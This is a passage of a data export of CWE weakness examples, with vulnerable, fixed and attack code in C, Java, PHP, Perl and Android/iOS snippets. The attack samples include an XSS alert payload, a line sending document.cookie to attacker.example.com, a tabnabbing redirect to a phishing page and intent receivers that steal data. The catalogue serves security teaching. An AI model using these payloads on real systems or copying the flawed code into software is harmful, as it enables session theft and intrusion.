// read and process messages

                                       
...

                                 
}

                              

                           

                           

                           
// keep trying to establish connection to the server

                           
} while (connected < 0);

                           

                           
// close socket and return success or failure

                           
...

                     
}

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
int processMessagesFromServer(char *hostaddr, int port) {

                        
...

                           
// initialize number of attempts counter

                           
int count = 0;
do {

                              

                                 

                                 
// establish connection to server

                                 
connected = connect(servsock, (struct sockaddr *)&servaddr, sizeof(servaddr));

                                 

                                 
// increment counter

                                 
count++;

                                 

                                 
// if connected then read and process messages from server

                                 
if (connected > -1) {

                                    

                                       

                                       
// read and process messages

                                       
...

                                 
}

                              

                           

                           

                           
// keep trying to establish connection to the server

                           

                           

                           
// up to a maximum number of attempts

                           
} while (connected < 0 && count < MAX_ATTEMPTS);

                           

                           
// close socket and return success or failure

                           
...

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public boolean isReorderNeeded(String bookISBN, int rateSold) {

                        

                           
boolean isReorder = false;

                           
int minimumCount = 10;
int days = 0;

                           

                           
// get inventory count for book

                           
int inventoryCount = inventory.getIventoryCount(bookISBN);

                           

                           
// find number of days until inventory count reaches minimum

                           
while (inventoryCount > minimumCount) {

                              

                                 
inventoryCount = inventoryCount - rateSold;
days++;

                              

                           
}

                           

                           
// if number of days within reorder timeframe

                           

                           

                           
// set reorder return boolean to true

                           
if (days > 0 && days < 5) {
isReorder = true;
}

                           
return isReorder;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
public boolean isReorderNeeded(String bookISBN, int rateSold) {

                        
...

                           

                           
// validate rateSold variable

                           
if (rateSold < 1) {
return isReorder;
}

                           
...

                     
}

               "
836,
837,
838,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$username = $_POST['username'];
$picSource = $_POST['picsource'];
$picAltText = $_POST['picalttext'];

                     
...

                     

                     
echo ""<title>Welcome, "" . htmlentities($username) .""</title>"";
echo ""<img src='"". htmlentities($picSource) ."" ' alt='"". htmlentities($picAltText) . '"" />';

                     
...

                     

                  

               
example: 2
NATURE:attack:
                  
""altTextHere' onload='alert(document.cookie)""

               
example: 3
NATURE:result:
LANGUAGE:HTML:
                  
<img src='pic.jpg' alt='altTextHere' onload='alert(document.cookie)' />

               "
839,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
DataPacket *packet;
int numHeaders;
PacketHeader *headers;

                     
sock=AcceptSocketConnection();
ReadPacket(packet, sock);
numHeaders =packet->headers;

                     
if (numHeaders > 100) {
ExitError(""too many headers!"");
}
headers = malloc(numHeaders * sizeof(PacketHeader);
ParsePacketHeaders(packet, headers);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
int GetUntrustedInt () {
return(0x0000FFFF);
}

                     
void main (int argc, char **argv) {

                        
char path[256];
char *input;
int i;
short s;
unsigned int sz;

                           
i = GetUntrustedInt();
s = i;
/* s is -1 so it passes the safety check - CWE-697 */
if (s > 256) {
DiePainfully(""go away!\n"");
}

                           
/* s is sign-extended and saved in sz */
sz = s;

                           
/* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */
printf(""i=%d, s=%d, sz=%u\n"", i, s, sz);

                           
input = GetUserInput(""Enter pathname:"");

                           
/* strncpy interprets s as unsigned int, so it's treated as MAX_INT
(CWE-195), enabling buffer overflow (CWE-119) */
strncpy(path, input, s);
path[255] = '\0'; /* don't want CWE-170 */
printf(""Path is: %s\n"", path);

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int getValueFromArray(int *array, int len, int index) {

                        

                           
int value;

                           

                           
// check that the array index is less than the maximum

                           

                           

                           
// length of the array

                           
if (index < len) {

                              

                                 

                                 
// get the value at the specified index of the array

                                 
value = array[index];

                           
}

                           
// if array index is invalid then output error message

                           

                           

                           
// and return value indicating error

                           
else {
printf(""Value is: %d\n"", array[index]);
value = -1;
}

                           
return value;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:C:
                  

                     
...

                     

                     
// check that the array index is within the correct

                     

                     

                     
// range of values for the array

                     
if (index >= 0 && index < len) {

                     
...

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
public class BankAccount {

                        

                           
public final int MAXIMUM_WITHDRAWAL_LIMIT = 350;

                           

                           
// variable for bank account balance

                           
private double accountBalance;

                           

                           
// constructor for BankAccount

                           
public BankAccount() {
accountBalance = 0;
}

                           

                           
// method to deposit amount into BankAccount

                           
public void deposit(double depositAmount) {...}

                           

                           
// method to withdraw amount from BankAccount

                           
public void withdraw(double withdrawAmount) {

                              

                                 
if (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT) {

                                    

                                       
double newBalance = accountBalance - withdrawAmount;
accountBalance = newBalance;

                                 
}
else {
System.err.println(""Withdrawal amount exceeds the maximum limit allowed, please try again..."");
...
}

                           
}

                           

                           
// other methods for accessing the BankAccount object

                           
...

                     
}

               
example: 6
NATURE:good:
LANGUAGE:Java:
                  
public class BankAccount {

                        

                           
public final int MINIMUM_WITHDRAWAL_LIMIT = 0;
public final int MAXIMUM_WITHDRAWAL_LIMIT = 350;

                           
...

                           

                           
// method to withdraw amount from BankAccount

                           
public void withdraw(double withdrawAmount) {

                              

                                 
if (withdrawAmount < MAXIMUM_WITHDRAWAL_LIMIT &&
withdrawAmount > MINIMUM_WITHDRAWAL_LIMIT) {

                                    

                                       
...

                                 

                              

                           

                        

                     

                  

               "
841,"
example: 1
NATURE:bad:
LANGUAGE:Python:
                  
def dispatchCommand(command, user, args):

                        
if command == 'Login':
loginUser(args)
return

                           

                           

                           
# user has requested a file

                           
if command == 'Retrieve_file':
if authenticated(user) and ownsFile(user,args):
sendFile(args)
return

                           
if command == 'List_files':
listFiles(args)
return

                           

                           
...

                           

                        

                     

                  

               
example: 2
NATURE:good:
LANGUAGE:Python:
                  
def dispatchCommand(command, user, args):

                        

                           

                           
...

                           
if command == 'List_files':
if authenticated(user) and ownsDirectory(user,args):
listFiles(args)
return

                           

                           

                           
...

                           

                        

                     

                  

               "
842,
843,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define NAME_TYPE 1
#define ID_TYPE 2

                     
struct MessageBuffer
{
int msgType;
union {
char *name;
int nameID;
};
};

                     

                     
int main (int argc, char **argv) {

                        
struct MessageBuffer buf;
char *defaultMessage = ""Hello World"";

                           
buf.msgType = NAME_TYPE;
buf.name = defaultMessage;
printf(""Pointer of buf.name is %p\n"", buf.name);

                           
/* This particular value for nameID is used to make the code architecture-independent. If coming from untrusted input, it could be any value. */

                           

                           
buf.nameID = (int)(defaultMessage + 1);
printf(""Pointer of buf.name is now %p\n"", buf.name);
if (buf.msgType == NAME_TYPE) {
printf(""Message: %s\n"", buf.name);
}
else {
printf(""Message: Use ID %d\n"", buf.nameID);
}

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$value = $_GET['value'];
$sum = $value + 5;
echo ""value parameter is '$value'<p>"";
echo ""SUM is $sum"";

               
example: 3
NATURE:bad:
LANGUAGE:Perl:
                  
my $UserPrivilegeArray = [""user"", ""user"", ""admin"", ""user""];

                     
my $userID = get_current_user_ID();

                     
if ($UserPrivilegeArray eq ""user"") {
print ""Regular user!\n"";
}
else {
print ""Admin!\n"";
}

                     
print ""\$UserPrivilegeArray = $UserPrivilegeArray\n"";

               "
862,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function runEmployeeQuery($dbName, $name){
mysql_select_db($dbName,$globalDbHandle) or die(""Could not open Database"".$dbName);

                        
//Use a prepared statement to avoid CWE-89

                        
$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');
$preparedStatement->execute(array(':name' => $name));
return $preparedStatement->fetchAll();
}

                     
/.../

                     

                     
$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);

               
example: 2
NATURE:bad:
LANGUAGE:Perl:
                  
sub DisplayPrivateMessage {
my($id) = @_;
my $Message = LookupMessageObject($id);
print ""From: "" . encodeHTML($Message->{from}) . ""<br>\n"";
print ""Subject: "" . encodeHTML($Message->{subject}) . ""\n"";
print ""<hr>\n"";
print ""Body: "" . encodeHTML($Message->{body}) . ""\n"";
}

                     
my $q = new CGI;

                     
# For purposes of this example, assume that CWE-309 and

                     

                     

                     

                     
# CWE-523 do not apply.

                     
if (! AuthenticateUser($q->param('username'), $q->param('password'))) {
ExitError(""invalid username or password"");
}

                     
my $id = $q->param('id');
DisplayPrivateMessage($id);

               "
863,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$role = $_COOKIES['role'];
if (!$role) {
$role = getRole('user');
if ($role) {
// save the cookie to send out in future responses
setcookie(""role"", $role, time()+60*60*2);
}
else{
ShowLoginScreen();
die(""\n"");
}
}
if ($role == 'Reader') {
DisplayMedicalHistory($_POST['patient_ID']);
}
else{
die(""You are not Authorized to view this record\n"");
}

               "
908,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private boolean initialized = true;
public void someMethod() {

                        
if (!initialized) {

                              

                                 

                                 
// perform initialization tasks

                                 
...

                                 
initialized = true;

                           
}

                     

                  

               
example: 2
NATURE:bad:
LANGUAGE:Perl:
                  
$username = GetCurrentUser();
$state = GetStateData($username);
if (defined($state)) {
$uid = ExtractUserID($state);
}

                     

                     
# do stuff

                     
if ($uid == 0) {
DoAdminThings();
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
char str[20];
strcat(str, ""hello world"");
printf(""%s"", str);

               "
909,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private boolean initialized = true;
public void someMethod() {

                        
if (!initialized) {

                              

                                 

                                 
// perform initialization tasks

                                 
...

                                 
initialized = true;

                           
}

                     

                  

               
example: 2
NATURE:bad:
LANGUAGE:Perl:
                  
$username = GetCurrentUser();
$state = GetStateData($username);
if (defined($state)) {
$uid = ExtractUserID($state);
}

                     

                     
# do stuff

                     
if ($uid == 0) {
DoAdminThings();
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
char str[20];
strcat(str, ""hello world"");
printf(""%s"", str);

               "
910,
911,
912,
913,
914,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  

                     
//Log user in, and set $isAdmin to true if user is an administrator

                     

                     
function login($user,$pass){
$query = buildQuery($user,$pass);
mysql_query($query);
if(getUserRole($user) == ""Admin""){
$isAdmin = true;
}
}

                     
$isAdmin = false;
extract($_POST);
login(mysql_real_escape_string($user),mysql_real_escape_string($pass));

               "
915,
916,
917,
918,
920,
921,
922,
923,
924,
925,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<manifest package=""com.example.vulnerableApplication"">

                        
<application>

                           
...

                           

                           

                              
<receiver android:name="".ShutdownReceiver"">
<intent-filter>
<action android:name=""android.intent.action.ACTION_SHUTDOWN"" />
</intent-filter>
</receiver>

                           

                           

                           
...

                           

                           
</application>

                     
</manifest>

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
...

                     
IntentFilter filter = new IntentFilter(Intent.ACTION_SHUTDOWN);
BroadcastReceiver sReceiver = new ShutDownReceiver();
registerReceiver(sReceiver, filter);

                     
...

                     

                     
public class ShutdownReceiver extends BroadcastReceiver {
@Override
public void onReceive(final Context context, final Intent intent) {
mainActivity.saveLocalData();
mainActivity.stopActivity();
}
}

               
example: 3
NATURE:attack:
LANGUAGE:Java:
                  
window.location = examplescheme://method?parameter=value

               "
926,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<activity android:name=""com.example.vulnerableApp.mainScreen"">

                        

                           

                           
...

                           
<intent-filter>
<action android:name=""com.example.vulnerableApp.OPEN_UI"" />
<category android:name=""android.intent.category.DEFAULT"" />
</intent-filter>

                           
...

                           

                        

                     
</activity>
<service android:name=""com.example.vulnerableApp.backgroundService"">

                        

                           

                           
...

                           
<intent-filter>
<action android:name=""com.example.vulnerableApp.START_BACKGROUND"" />
</intent-filter>

                           
...

                           

                        

                     
</service>

               
example: 2
NATURE:bad:
LANGUAGE:XML:
                  
<provider>
android:name=""com.example.vulnerableApp.searchDB""
android:authorities=""com.example.vulnerableApp.searchDB"">
</provider>

               "
927,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Intent intent = new Intent();
intent.setAction(""com.example.CreateUser"");
intent.putExtra(""Username"", uname_string);
intent.putExtra(""Password"", pw_string);
sendBroadcast(intent);

               
example: 2
NATURE:attack:
LANGUAGE:Java:
                  
IntentFilter filter = new IntentFilter(""com.example.CreateUser"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
Intent intent = new Intent();
intent.setAction(""com.example.service.UserExists"");
intent.putExtra(""Username"", uname_string);
sendStickyBroadcast(intent);

               
example: 4
NATURE:attack:
LANGUAGE:Java:
                  
IntentFilter filter = new IntentFilter(""com.example.service.UserExists"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
Intent intent = new Intent();
intent.setAction(""com.example.OpenURL"");
intent.putExtra(""URL_TO_OPEN"", url_string);
sendOrderedBroadcastAsUser(intent);

               
example: 6
NATURE:attack:
LANGUAGE:Java:
                  
public class CallReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
String Url = intent.getStringExtra(Intent.URL_TO_OPEN);
attackURL = ""www.example.com/attack?"" + Url;
setResultData(attackURL);
}
}

               
example: 7
NATURE:bad:
LANGUAGE:Java:
                  
Intent intent = new Intent();
intent.setAction(""com.example.BackupUserData"");
intent.setData(file_uri);
intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);
sendBroadcast(intent);

               
example: 8
NATURE:attack:
LANGUAGE:Java:
                  
public class CallReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
Uri userData = intent.getData();
stealUserData(userData);
}
}

               "
939,"
example: 1
NATURE:good:
LANGUAGE:Objective-C:
                  
NSString *stringURL = @""appscheme://replaceFileText?file=incomingMessage.txt&text=hello"";
NSURL *url = [NSURL URLWithString:stringURL];
[[UIApplication sharedApplication] openURL:url];

               
example: 2
NATURE:bad:
                  

                     
- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {
if (!url) {
return NO;
}
NSString *action = [url host];
if([action isEqualToString: @""replaceFileText""]) {
NSDictionary *dict = [self parseQueryStringExampleFunction:[url query]];

                           
//this function will write contents to a specified file

                           
FileObject *objectFile = [self writeToFile:[dict objectForKey: @""file""] withText:[dict objectForKey: @""text""]];
}
return YES;
}

               
example: 3
NATURE:attack:
LANGUAGE:HTML:
                  
<iframe src=""appscheme://replaceFileText?file=Bookmarks.dat&text=listOfMaliciousWebsites"">

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
@Override
public boolean shouldOverrideUrlLoading(WebView view, String url){

                        
if (url.substring(0,14).equalsIgnoreCase(""examplescheme:"")){
if(url.substring(14,25).equalsIgnoreCase(""getUserInfo"")){
writeDataToView(view, UserData);
return false;
}
else{
return true;
}
}

                     
}

               
example: 5
NATURE:bad:
LANGUAGE:Objective-C:
                  
-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType
{

                        
NSURL *URL = [exRequest URL];
if ([[URL scheme] isEqualToString:@""exampleScheme""])
{

                              
NSString *functionString = [URL resourceSpecifier];
if ([functionString hasPrefix:@""specialFunction""])
{

                                    

                                       

                                       
// Make data available back in webview.

                                       
UIWebView *webView = [self writeDataToView:[URL query]];

                                 
}
return NO;

                           
}
return YES;

                     
}

               
example: 6
NATURE:attack:
LANGUAGE:JavaScript:
                  
window.location = examplescheme://method?parameter=value

               "
940,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
IntentFilter filter = new IntentFilter(""com.example.RemoveUser"");
MyReceiver receiver = new MyReceiver();
registerReceiver(receiver, filter);

                     
public class DeleteReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
int userID = intent.getIntExtra(""userID"");
destroyUserData(userID);
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
// Android

                     
@Override
public boolean shouldOverrideUrlLoading(WebView view, String url){

                        
if (url.substring(0,14).equalsIgnoreCase(""examplescheme:"")){
if(url.substring(14,25).equalsIgnoreCase(""getUserInfo"")){
writeDataToView(view, UserData);
return false;
}
else{
return true;
}
}

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:Objective-C:
                  

                     

                     
// iOS

                     
-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType
{

                        
NSURL *URL = [exRequest URL];
if ([[URL scheme] isEqualToString:@""exampleScheme""])
{

                              
NSString *functionString = [URL resourceSpecifier];
if ([functionString hasPrefix:@""specialFunction""])
{

                                    

                                       

                                       
// Make data available back in webview.

                                       
UIWebView *webView = [self writeDataToView:[URL query]];

                                 
}
return NO;

                           
}
return YES;

                     
}

               
example: 4
NATURE:attack:
LANGUAGE:JavaScript:
                  
window.location = examplescheme://method?parameter=value

               "
941,"
example: 1
NATURE:bad:
LANGUAGE:Python:
                  
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind( (UDP_IP,UDP_PORT) )
while true:

                        
data = sock.recvfrom(1024)
if not data:
break

                           
(requestIP, nameToResolve) = parseUDPpacket(data)
record = resolveName(nameToResolve)
sendResponse(requestIP,record)

                     

                  

               "
942,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<cross-domain-policy xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
xsi:noNamespaceSchemaLocation=""http://www.adobe.com/xml/schemas/PolicyFile.xsd"">
<allow-access-from domain=""*.example.com""/>
<allow-access-from domain=""*""/>
</cross-domain-policy>

               
example: 2
NATURE:bad:
LANGUAGE:XML:
                  
<?xml version=""1.0"" encoding=""utf-8""?>
<access-policy>
<cross-domain-access>
<policy>
<allow-from http-request-headers=""SOAPAction"">
<domain uri=""*""/>
</allow-from>
<grant-to>
<resource path=""/"" include-subpaths=""true""/>
</grant-to>
</policy>
</cross-domain-access>
</access-policy>

               "
943,
1004,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String sessionID = generateSessionId();
Cookie c = new Cookie(""session_id"", sessionID);
response.addCookie(c);

               
example: 2
NATURE:attack:
LANGUAGE:JavaScript:
                  
document.write('<img src=""http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '"">'

               
example: 3
NATURE:good:
LANGUAGE:Java:
                  
String sessionID = generateSessionId();
Cookie c = new Cookie(""session_id"", sessionID);
c.setHttpOnly(true);
response.addCookie(c);

               "
1007,"
example: 1
NATURE:attack:
                  
http://www.xml.m

               
example: 2
NATURE:result:
                  
123.123.123.123 dmn [17/Jul/2017:09:05:49 -0400] ""GET /example/users/userlist HTTP/1.1"" 401 12846
123.123.123.123 dmn [17/Jul/2017:09:06:51 -0400] ""GET /example/users/userlist HTTP/1.1"" 200 4523
123.123.123.123 dmn [17/Jul/2017:09:10:02 -0400] ""GET /example/users/editusers HTTP/1.1"" 200 6291
123.123.123.123 dmn [17/Jul/2017:09:10:02 -0400] ""GET /example/users/editusers HTTP/1.1"" 200 6291
123.123.123.123 dmn [17/Jul/2017:09:10:02 -0400] ""GET /example/users/editusers HTTP/1.1"" 200 6291
123.123.123.123 dmn [17/Jul/2017:09:10:02 -0400] ""GET /example/users/editusers HTTP/1.1"" 200 6291

               "
1021,
1022,"
example: 1
NATURE:bad:
LANGUAGE:HTML:
                  
<a href=""http://attacker-site.example.com/useful-page.html"" target=""_blank"">

               
example: 2
NATURE:attack:
LANGUAGE:JavaScript:
                  
window.opener.location = 'http://phishing.example.org/popular-bank-page';

               
example: 3
NATURE:good:
LANGUAGE:HTML:
                  
<a href=""http://attacker-site.example.com/useful-page.html"" target=""_blank"" rel=""noopener noreferrer"">

               
example: 4
NATURE:bad:
LANGUAGE:JavaScript:
                  
var newWindow = window.open(""http://attacker-site.example.com/useful-page.html"", ""_blank"");

               
example: 5
NATURE:good:
LANGUAGE:JavaScript:
                  
var newWindow = window.open(""http://attacker-site.example.com/useful-page.html"", ""_blank"");
newWindow.opener = null;

               "
1023,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  

                     
/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */

                     
char *username = ""admin"";
char *pass = ""password"";

                     
int AuthenticateUser(char *inUser, char *inPass) {
if (strncmp(username, inUser, strlen(inUser))) {
logEvent(""Auth failure of username using strlen of inUser"");
return(AUTH_FAIL);
}
if (! strncmp(pass, inPass, strlen(inPass))) {
logEvent(""Auth success of password using strlen of inUser"");
return(AUTH_SUCCESS);
}
else {
logEvent(""Auth fail of password using sizeof"");
return(AUTH_FAIL);
}
}

                     
int main (int argc, char **argv) {
int authResult;
if (argc < 3) {
ExitError(""Usage: Provide a username and password"");
}
authResult = AuthenticateUser(argv[1], argv[2]);
if (authResult == AUTH_SUCCESS) {
DoAuthenticatedTask(argv[1]);
}
else {
ExitError(""Authentication failed"");
}
}

               
example: 2
NATURE:attack:
                  
p
pa
pas
pass

               "
1024,
1025,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String str1 = new String(""Hello"");
String str2 = new String(""Hello"");
if (str1 == str2) {
System.out.println(""str1 == str2"");
}

               
example: 2
NATURE:good:
                  
if (str1.equals(str2)) {
System.out.println(""str1 equals str2"");
}

               "
1037,
1038,
1039,
1041,
1042,
1043,
1044,
1045,
1046,
1047,
1048,
1049,
1050,
1051,
1052,
1053,
1054,
1055,
1056,
1057,
1058,
1059,
1060,
1061,
1062,
1063,
1064,
1065,
1066,
1067,
1068,
1069,
1070,
1071,
1072,
1073,
1074,
1075,
1076,
1077,
1078,
1079,
1080,
1082,
1083,
1084,
1085,
1086,
1087,
1088,
1089,
1090,
1091,
1092,
1093,
1094,
1095,
1096,
1097,
1098,
1099,
1100,
1101,
1102,
1103,
1104,
1105,
1106,
1107,
1108,
1109,
1110,
1111,
1112,
1113,
1114,
1115,
1116,
1117,
1118,
1119,
1120,
1121,
1122,
1123,
1124,
1125,
1126,
1127,
1164,
1173,
1174,
1176,
1177,
